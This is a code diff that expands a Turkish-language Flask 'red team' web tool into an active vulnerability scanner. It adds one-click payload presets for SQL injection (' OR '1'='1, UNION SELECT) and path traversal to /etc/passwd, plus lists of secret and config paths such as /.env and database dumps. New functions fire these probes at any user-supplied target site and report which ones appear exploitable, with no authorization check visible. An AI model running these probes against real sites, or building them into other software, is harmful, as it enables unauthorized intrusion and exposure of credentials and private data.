@@ -27,7 +27,7 @@ HTML_TEMPLATE = """
 <html lang="tr">
 <head>
     <meta charset="UTF-8">
-    <title>Linux Red Team Operations & Visual Recon Center</title>
+    <title>Linux Red Team Operations & Advanced Vuln Scanner</title>
     <style>
         body { background-color: #0b0f19; color: #f8fafc; font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; margin: 0; padding: 20px; }
         .container { max-width: 1250px; margin: 0 auto; background: #1e293b; padding: 30px; border-radius: 12px; box-shadow: 0 10px 25px rgba(0,0,0,0.6); }
@@ -39,12 +39,15 @@ HTML_TEMPLATE = """
         .tab-content.active { display: block; }
         .form-group { display: flex; flex-direction: column; gap: 10px; margin-bottom: 20px; }
         input[type="text"], textarea { padding: 14px; border-radius: 8px; border: 1px solid #475569; background: #0f172a; color: #fff; font-size: 15px; }
-        textarea { resize: vertical; height: 100px; font-family: monospace; }
+        textarea { resize: vertical; height: 110px; font-family: monospace; }
         button { padding: 14px 24px; background: #0284c7; color: white; border: none; border-radius: 8px; font-size: 16px; cursor: pointer; transition: 0.2s; font-weight: bold; }
         button:hover { background: #0369a1; }
         button.secondary { background: #0d9488; }
         button.success { background: #16a34a; }
         button.danger { background: #dc2626; }
+        .preset-container { display: flex; gap: 8px; flex-wrap: wrap; margin-bottom: 15px; }
+        .preset-btn { background: #334155; color: #38bdf8; border: 1px solid #475569; padding: 8px 12px; border-radius: 6px; cursor: pointer; font-size: 13px; font-weight: bold; }
+        .preset-btn:hover { background: #475569; color: #fff; }
         .actions { display: flex; gap: 10px; margin-top: 15px; display: none; }
         .terminal { background: #000; color: #34d399; padding: 20px; border-radius: 8px; border: 1px solid #334155; white-space: pre-wrap; font-family: 'Courier New', Courier, monospace; margin-top: 20px; max-height: 500px; overflow-y: auto; font-size: 13px; line-height: 1.5; }
         .loading { color: #facc15; font-style: italic; font-weight: bold; font-size: 15px; }
@@ -58,10 +61,10 @@ HTML_TEMPLATE = """
 </head>
 <body>
     <div class="container">
-        <h1>🐧 Linux Red Team Operations & Visual Recon Center</h1>
+        <h1>🐧 Linux Red Team Operations & Advanced Vuln Scanner</h1>
         
         <div class="tabs">
-            <button class="tab-btn active" onclick="switchTab('scanTab')">🚀 Canlı Keşif & Fuzzing</button>
+            <button class="tab-btn active" onclick="switchTab('scanTab')">🚀 Canlı Keşif & Zafiyet Testi</button>
             <button class="tab-btn" onclick="switchTab('dataTab')" id="dataTabBtn">📁 Site Verileri & Görsel Arşiv</button>
         </div>
 
@@ -71,11 +74,20 @@ HTML_TEMPLATE = """
                 <label><b>Hedef Site:</b></label>
                 <input type="text" id="targetUrl" placeholder="Hedef siteyi gir (örn: example.com)">
             </div>
+            
             <div class="form-group">
-                <label><b>Özel Kelime Listesi (Wordlist - Her satıra bir yol):</b></label>
-                <textarea id="customWordlist" placeholder="/admin/&#10;/secret.php&#10;/.env&#10;/backup.zip"></textarea>
+                <label><b>💡 Hazır Kelime Listesi / Payload Havuzu (Tek tıkla ekle):</b></label>
+                <div class="preset-container">
+                    <button class="preset-btn" onclick="loadPreset('config')">📂 Kritik Config & Backup</button>
+                    <button class="preset-btn" onclick="loadPreset('admin')">🔑 Admin & Panel Yolları</button>
+                    <button class="preset-btn" onclick="loadPreset('sqli')">⚡ SQL Injection Payloadları</button>
+                    <button class="preset-btn" onclick="loadPreset('lfi')">📁 LFI / Path Traversal</button>
+                    <button class="preset-btn" onclick="clearWordlist()">🧹 Temizle</button>
+                </div>
+                <textarea id="customWordlist" placeholder="Hazır listeleri yukarıdan seçebilir veya buraya kendi yollarınızı yazabilirsiniz..."></textarea>
             </div>
-            <button onclick="startScan()">Linux Terminal Taramasını Başlat</button>
+
+            <button onclick="startScan()">Linux Zafiyet Taramasını Başlat</button>
             
             <div id="status" class="loading" style="margin-top: 15px;"></div>
             
@@ -101,6 +113,22 @@ HTML_TEMPLATE = """
         let currentReportText = "";
         let lastTarget = "";
 
+        const presets = {
+            config: "/.env\\n/config.json\\n/config.php\\n/database.sql\\n/backup.sql\\n/db.bak\\n/composer.json\\n/package.json\\n/web.config",
+            admin: "/admin/\\n/phpmyadmin/\\n/wp-login.php\\n/panel/\\n/dashboard/\\n/cpanel/\\n/login.php",
+            sqli: "/?id=1'\\n/?id=1 UNION SELECT null,null--\\n/?search=test' OR '1'='1\\n/api/v1/users?id=1'",
+            lfi: "/?page=../../../../etc/passwd\\n/?file=../../../../etc/hosts\\n/index.php?doc=../../win.ini"
+        };
+
+        function loadPreset(type) {
+            const textarea = document.getElementById('customWordlist');
+            textarea.value = presets[type].replace(/\\n/g, '\\n');
+        }
+
+        function clearWordlist() {
+            document.getElementById('customWordlist').value = "";
+        }
+
         function switchTab(tabId) {
             document.querySelectorAll('.tab-content').forEach(el => el.classList.remove('active'));
             document.querySelectorAll('.tab-btn').forEach(el => el.classList.remove('active'));
@@ -119,7 +147,7 @@ HTML_TEMPLATE = """
             if(!url) { alert('Lütfen geçerli bir hedef gir!'); return; }
             lastTarget = url;
             
-            statusDiv.innerHTML = "root@red-team-box:~# executing visual-recon, fuzzing & grading suite...";
+            statusDiv.innerHTML = "root@red-team-box:~# executing SQLi, LFI, SSRF, fuzzing & grading suite...";
             resultsDiv.style.display = "none";
             actionButtons.style.display = "none";
             resultsDiv.innerHTML = "";
@@ -249,27 +277,24 @@ def api_view_file():
 def api_download_pdf():
     target = request.args.get("target", "")
     record = next((item for item in SITE_DATABASE if item["target"] == target), None)
-    
-    report_content = record["full_report"] if record else f"Red Team Recon Report for {target}\nNo detailed report found in cache."
+    report_content = record["full_report"] if record else f"Red Team Report for {target}"
     
     class PDF(FPDF):
         def header(self):
             self.set_font('Arial', 'B', 12)
             self.set_text_color(2, 132, 199)
-            self.cell(0, 10, 'Linux Red Team - Professional Security Report', 0, 1, 'C')
+            self.cell(0, 10, 'Linux Red Team - Advanced Security Report', 0, 1, 'C')
             self.ln(5)
-
         def footer(self):
             self.set_y(-15)
             self.set_font('Arial', 'I', 8)
             self.set_text_color(150, 150, 150)
-            self.cell(0, 10, f'Generated by Red Team Operations Center', 0, 0, 'C')
+            self.cell(0, 10, 'Generated by Red Team Operations Center', 0, 0, 'C')
 
     pdf = PDF()
     pdf.add_page()
     pdf.set_font('Courier', '', 9)
     pdf.set_text_color(30, 41, 59)
-    
     safe_text = report_content.encode('latin-1', 'replace').decode('latin-1')
     pdf.multi_cell(0, 5, safe_text)
     
@@ -278,7 +303,7 @@ def api_download_pdf():
         io.BytesIO(pdf_output),
         mimetype='application/pdf',
         as_attachment=True,
-        download_name=f'recon_report_{urllib.parse.urlparse(target).netloc or target}.pdf'
+        download_name=f'vuln_report_{urllib.parse.urlparse(target).netloc or target}.pdf'
     )
 
 @app.route("/api/telegram-send", methods=["POST"])
@@ -378,6 +403,34 @@ def analyze_javascript_endpoints(target_url, html_content):
     except: pass
     return list(found)
 
+def test_sql_injection(target_url):
+    sqli_vulns = []
+    test_payloads = ["?id=1'", "/?search=test'", "/api/v1/users?id=1'"]
+    sql_errors = ["sql syntax", "mysql_fetch", "syntax error", "unclosed quotation", "odbc_driver"]
+    for payload in test_payloads:
+        test_url = f"{target_url.rstrip('/')}{payload}"
+        try:
+            r = requests.get(test_url, timeout=3, verify=False, headers={"User-Agent": "Mozilla/5.0"})
+            body_lower = r.text.lower()
+            for err in sql_errors:
+                if err in body_lower:
+                    sqli_vulns.append(test_url)
+                    break
+        except: pass
+    return sqli_vulns
+
+def test_lfi_traversal(target_url):
+    lfi_vulns = []
+    test_payloads = ["/?page=../../../../etc/passwd", "/?file=../../../../etc/passwd"]
+    for payload in test_payloads:
+        test_url = f"{target_url.rstrip('/')}{payload}"
+        try:
+            r = requests.get(test_url, timeout=3, verify=False, headers={"User-Agent": "Mozilla/5.0"})
+            if "root:x:0:0" in r.text or "bin:x" in r.text:
+                lfi_vulns.append(test_url)
+        except: pass
+    return lfi_vulns
+
 def red_team_comprehensive_recon(target_url, custom_paths=[]):
     if not target_url.startswith("http"): target_url = f"https://{target_url}"
     is_https = target_url.startswith("https")
@@ -385,7 +438,7 @@ def red_team_comprehensive_recon(target_url, custom_paths=[]):
     domain = parsed.netloc or parsed.path
     domain = domain.split('/')[0]
     
-    report = f"root@red-team-box:~# ./recon-suite.sh --target {target_url}\n"
+    report = f"root@red-team-box:~# ./advanced-vuln-scanner.sh --target {target_url}\n"
     report += "=" * 65 + "\n\n"
     
     accessible_files = []
@@ -441,6 +494,25 @@ def red_team_comprehensive_recon(target_url, custom_paths=[]):
     except: pass
     report += "-" * 40 + "\n"
 
+    # Zafiyet Testleri (SQLi & LFI)
+    report += "[*] Aktif Zafiyet Taraması (SQL Injection & LFI / Path Traversal)...\n"
+    sqli_results = test_sql_injection(target_url)
+    if sqli_results:
+        for sq in sqli_results:
+            report += f"  🚨 [VULN - SQLi] Potansiyel SQL Injection: {sq}\n"
+            accessible_files.append(sq)
+    else:
+        report += "  -> Doğrudan SQLi imzası saptanamadı.\n"
+
+    lfi_results = test_lfi_traversal(target_url)
+    if lfi_results:
+        for lf in lfi_results:
+            report += f"  🚨 [VULN - LFI] Kritik Dosya Okuma Açığı: {lf}\n"
+            accessible_files.append(lf)
+    else:
+        report += "  -> Standart LFI dizin atlama açıklarına rastlanmadı.\n"
+    report += "-" * 40 + "\n"
+
     report += "[*] Hassas Dosya ve Dizin Taraması (Custom Wordlist Fuzzing)...\n"
     default_paths = [
         "/robots.txt", "/sitemap.xml", "/.env", "/config.json", "/config.php",
@@ -449,6 +521,7 @@ def red_team_comprehensive_recon(target_url, custom_paths=[]):
     all_paths = list(set(default_paths + custom_paths))
     
     for path in all_paths:
+        if path.startswith("http") or path.startswith("/?"): continue
         t_url = f"{target_url.rstrip('/')}{path}"
         try:
             res = requests.get(t_url, timeout=3, verify=False, headers={"User-Agent": "Mozilla/5.0"})
@@ -459,7 +532,7 @@ def red_team_comprehensive_recon(target_url, custom_paths=[]):
                 report += f"  [FORBIDDEN - 403] {path}\n"
         except: pass
 
-    report += "\n" + "=" * 65 + "\nroot@red-team-box:~# Scan Completed."
+    report += "\n" + "=" * 65 + "\nroot@red-team-box:~# Advanced Vulnerability Scan Completed."
     
     record = {
         "time": datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
